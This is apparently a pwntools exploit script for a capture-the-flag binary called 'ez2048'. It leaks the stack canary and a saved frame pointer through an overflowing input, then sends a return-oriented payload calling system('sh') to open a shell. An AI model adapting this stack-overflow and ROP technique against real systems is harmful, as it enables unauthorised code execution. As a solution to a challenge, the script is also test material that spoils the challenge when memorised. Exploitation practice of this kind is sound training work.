from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./ez2048')
#p = remote('challenge.bluesharkinfo.com',29260)
elf = ELF('./ez2048')
p.sendlineafter(b"input your name\n>", b"Hacker")
p.sendlineafter(b"Press \"Enter\" to start the game", b"")

for i in range(6):
    p.sendline(b"q") 
    if i < 5:
        p.recvuntil(b"new round\n>")
        p.sendline(b"a")
    else:
        p.recvuntil(b"new round\n>")
        p.sendline(b"Q")

p.sendafter(b"$ ", b'A' * 136 + b'B')
p.recvuntil(b"executing command: ")
p.recvuntil(b'A' * 136 + b'B')
canary = u64(b'\x00' + p.recv(7))
log.success(f"Canary: {hex(canary)}")

log.info("Leaking Stack Address...")
p.sendafter(b"$ ", b'A' * 144)
p.recvuntil(b"executing command: ")
p.recvuntil(b'A' * 144)
stack_raw = p.recv(6)
saved_rbp = u64(stack_raw + b'\x00\x00')
buf_addr = saved_rbp - 0xa0 
log.success(f"Saved RBP: {hex(saved_rbp)}")
log.success(f"Buf Address (Calculated -0x98): {hex(buf_addr)}")
gadget_addr = elf.symbols['gadget'] 
system_addr = elf.plt['system']
ret = 0x40101a 

cmd_offset = 176
cmd_addr = buf_addr + cmd_offset
log.info(f"Targeting command at: {hex(cmd_addr)}")
command = b"sh\x00" 

payload = flat([
    b'\x00' * 136,            
    p64(canary),             
    p64(cmd_addr),           
    gadget_addr, 
    system_addr,    
    p64(0xdeadbeef),          
    command                   
])
p.sendafter(b"$ ", payload)
p.sendlineafter(b'$ ',b"exit") 
p.interactive()
